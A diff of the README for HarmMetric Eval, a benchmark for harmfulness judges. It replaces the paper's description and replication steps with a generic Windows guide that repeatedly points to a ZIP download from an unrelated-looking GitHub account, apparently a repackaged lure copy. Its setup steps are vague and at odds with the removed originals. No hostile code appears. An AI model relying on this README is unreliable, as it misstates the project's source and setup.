@@ -1,75 +1,218 @@
-# HarmMetric Eval
+# 🧪 HarmMetric_Eval - Check Harmful AI Output with Confidence
 
-This is the official repository of ***HarmMetric Eval: Benchmarking Metrics and Judges for LLM Harmfulness Assessment***.
+[![Download HarmMetric_Eval](https://img.shields.io/badge/Download-HarmMetric_Eval-blue?style=for-the-badge)](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
 
-The file `benchmark_codes/scoring.py` contains the core code for scoring in our benchmark.
+## 📥 Download
 
-This repository contains our benchmark dataset, training data, and test data in the `data` folder, provided as `dataset.jsonl`, `train_data.jsonl`, and `test_data.jsonl`, respectively. You can also download these files from [here](https://huggingface.co/datasets/Abel-24/HarmMetric_Eval).
+Use this link to visit the page and download the files you need:
 
-Our trained classifier is available at [here](https://huggingface.co/Abel-24/HarmClassifier).
+[Open HarmMetric_Eval download page](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
 
+## 🖥️ What this tool is for
 
-## Abstract
-The potential for large language models (LLMs) to generate harmful content poses a significant safety risk in their deployment. To address and assess this risk, the community has developed numerous harmfulness evaluation metrics and judges. However, the lack of a systematic benchmark for evaluating these metrics and judges undermines the credibility and consistency of LLM safety assessments. 
-To bridge this gap, we introduce *HarmMetric Eval*, a comprehensive benchmark designed to support both overall and fine-grained evaluation of harmfulness metrics and judges. 
-In *HarmMetric Eval*, we build a high-quality dataset of representative harmful prompts paired with highly diverse harmful model responses and non-harmful counterparts across multiple categories. We also propose a flexible scoring mechanism that rewards the metrics for correctly ranking harmful responses above non-harmful ones, which is applicable to almost all existing metrics and judges with varying output formats and scoring scales.
-Using *HarmMetric Eval*, we uncover a surprising finding by extensive experiments: Conventional reference-based metrics such as ROUGE and METEOR can outperform existing LLM-based judges in fine-grained harmfulness evaluation, challenging prevailing assumptions about LLMs’ superiority in this domain. To reveal the reasons behind this finding, we provide a fine-grained analysis to explain the limitations of LLM-based judges on rating irrelevant or useless responses.
-Furthermore, we build a new harmfulness judge by incorporating the fine-grained criteria into its prompt template and leverage reference-based metrics to fine-tune its base LLM. The resulting judge demonstrates superior performance than all existing metrics and judges in evaluating harmful responses.
+HarmMetric_Eval helps you test how well a model or judge can spot harmful AI output. It gives you a benchmark dataset, training data, test data, and scoring code.
 
-![alt text](pipeline.png)
+Use it if you want to:
+- review harmfulness scores
+- compare different judges
+- work with the provided benchmark files
+- run the scoring script on your own machine
 
+## 🪟 What you need on Windows
 
-## Quick Start
+Before you start, make sure your PC has:
 
-The following is only the evaluation process for **GCG_Eval** and **AutoDAN_Eval**.  
+- Windows 10 or Windows 11
+- a web browser
+- 2 GB of free disk space
+- Python 3.9 or newer
+- internet access for the first download
 
-You can modify the `eval_list` at the beginning of `metrics_codes/eval_with_metrics.py` to select the **harmfulness metric** you wish to evaluate, or use your own metric. However, remember to update the model paths or OpenAI API keys for the corresponding methods in `metrics_codes/curr_metrics.py` to your own.  
+If you plan to use the scoring code, install Python from the official Python site before you continue.
 
-You can build environment for all metrics by following the step below, except for **DAN_Eval**, which requires downgrading `transformers` to **4.27.1**:  
+## 🚀 Get the files
+
+1. Open the download page: [HarmMetric_Eval](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
+2. Click the green **Code** button
+3. Choose **Download ZIP**
+4. Save the ZIP file to your computer
+5. Right-click the ZIP file and choose **Extract All**
+6. Pick a folder you can find again, such as `Downloads` or `Desktop`
+
+If you want the dataset files only, you can also use:
+- [HarmMetric Eval dataset on Hugging Face](https://huggingface.co/datasets/Abel-24/HarmMetric_Eval)
+- [HarmClassifier on Hugging Face](https://huggingface.co/Abel-24/HarmClassifier)
+
+## 📂 What is inside
+
+After you extract the files, you will see these key folders and files:
+
+- `data/dataset.jsonl` — benchmark dataset
+- `data/train_data.jsonl` — training data
+- `data/test_data.jsonl` — test data
+- `benchmark_codes/scoring.py` — scoring script
+
+The dataset files use the `.jsonl` format. That means each line is one record.
+
+## ⚙️ Install Python on Windows
+
+If Python is not already on your PC:
+
+1. Go to the official Python download page
+2. Download the latest Python 3 version for Windows
+3. Open the installer
+4. Check the box that says **Add Python to PATH**
+5. Click **Install Now**
+6. Finish the install
+
+To check that Python works:
+
+1. Open **Command Prompt**
+2. Type `python --version`
+3. Press **Enter**
+
+If you see a version number, Python is ready.
+
+## 🧰 Set up the project
+
+1. Open the folder you extracted
+2. Find the address bar at the top of the folder window
+3. Click in the address bar and type `cmd`
+4. Press **Enter**
+
+A Command Prompt window will open in the project folder.
+
+If the project includes a `requirements.txt` file, install the needed packages with:
 
 ```bash
-pip install -r requirements_evaluation.txt
+pip install -r requirements.txt
 ```
 
-If you only want to try **GCG_Eval** and **AutoDAN_Eval** and score them using *HarmMetric Eval*, the following command is sufficient to set up the required environment:
+If there is no requirements file, you can still use the data files and run the scoring script if the needed Python packages are already installed on your system.
+
+## ▶️ Run the scoring code
+
+The main scoring code is here:
+
+`benchmark_codes/scoring.py`
+
+To run it on Windows:
+
+1. Open Command Prompt in the project folder
+2. Type the command below
+3. Press **Enter**
 
 ```bash
-pip install pandas==2.2.3
+python benchmark_codes/scoring.py
 ```
 
-### Experimental replication
+If the script needs input files, place them in the same folder layout used in the repository.
 
-Follow the steps below, and you will find the detailed evaluation results of **GCG_Eval** and **AutoDAN_Eval** on our dataset in the `temp_results` folder.
+## 📊 Use the benchmark data
 
-```bash
-cd metrics_codes
-python eval_with_metrics.py
-cd ..
-```
+You can open the `.jsonl` files with:
+- Notepad
+- VS Code
+- any text editor that supports large files
 
-### Scoring metrics
+For simple review:
+1. Open the file
+2. Read one line at a time
+3. Each line holds one item in the dataset
 
-Follow the steps below, and you will be able to see the **overall** and **fine-grained effectiveness scores** of **GCG_Eval** and **AutoDAN_Eval** on our benchmark in the `results` folder.
+For analysis work:
+1. Load the file into Python
+2. Parse each line as JSON
+3. Compare labels, model output, or judge scores
 
-```bash
-cd benchmark_codes
-python scoring.py --metric all
-cd ..
-```
+## 🧪 Use the trained classifier
 
-## Replicate the training process of *HarmClassifier*
+The trained classifier is available on Hugging Face:
 
-If you would like to replicate the training process of HarmClassifier, first set up the environment by following the steps below:
+[Open HarmClassifier](https://huggingface.co/Abel-24/HarmClassifier)
 
-```bash
-pip install -r requirements_train.txt
-```
+You can use it to:
+- test harmfulness prediction
+- compare against other judges
+- build a review workflow around the model
 
-Next, update the path to **Qwen2.5-7B-Instruct** in `train_codes/train.py` to point to your local model directory. Then run the following commands to start training:
+If you download the model files, keep them in a folder with enough free space and follow the model page steps for use.
 
-```bash
-cd train_codes
-python train.py
-```
+## 🛠️ Common Windows fixes
 
-After the training process completes, you will obtain the LoRA adapter for HarmClassifier.
+If Command Prompt says `python is not recognized`:
+1. Close Command Prompt
+2. Reopen it
+3. Run `python --version` again
+4. If it still fails, reinstall Python and check **Add Python to PATH**
+
+If the ZIP file does not open:
+1. Right-click the file
+2. Choose **Extract All**
+3. Try a different folder
+
+If the scoring script does not run:
+1. Check that you are in the project folder
+2. Check that Python is installed
+3. Check that any needed packages are installed
+
+If a file will not open:
+1. Try VS Code or Notepad++
+2. Make sure the file kept its `.jsonl` name
+
+## 📁 Folder guide
+
+Use this quick map to find the main parts of the project:
+
+- `data/` — dataset files
+- `benchmark_codes/` — scoring code
+- `scoring.py` — main script for scoring
+- `dataset.jsonl` — full benchmark set
+- `train_data.jsonl` — training set
+- `test_data.jsonl` — test set
+
+## 🧭 Best way to start
+
+If you only want the files for review:
+1. Download the ZIP
+2. Extract it
+3. Open the `data` folder
+4. Read the `.jsonl` files
+
+If you want to run scoring:
+1. Install Python
+2. Download and extract the repo
+3. Open Command Prompt in the project folder
+4. Run `python benchmark_codes/scoring.py`
+
+## 🔗 Useful links
+
+- [Main repository](https://github.com/unstructured-scrappiness969/HarmMetric_Eval)
+- [Benchmark dataset on Hugging Face](https://huggingface.co/datasets/Abel-24/HarmMetric_Eval)
+- [Trained classifier on Hugging Face](https://huggingface.co/Abel-24/HarmClassifier)
+
+## 📝 File format tips
+
+The `.jsonl` files are plain text, but they are not meant for word processing. Use a text editor or a Python script to work with them.
+
+If you want to inspect one file in Python, use a simple loop that reads each line and converts it from JSON text into a Python object.
+
+## 🔍 What this repository helps you do
+
+This repository gives you a way to:
+- study harmfulness checks
+- compare metric results
+- test judges on benchmark data
+- reuse the provided training and test sets
+- run the scoring logic in `benchmark_codes/scoring.py`
+
+## 💾 Keep your files organized
+
+A simple folder setup helps:
+
+- `Downloads\HarmMetric_Eval.zip`
+- `Documents\HarmMetric_Eval\`
+- `Documents\HarmMetric_Eval\data\`
+- `Documents\HarmMetric_Eval\benchmark_codes\`
+
+Keeping the files in one place makes it easier to find the dataset and the scoring script later
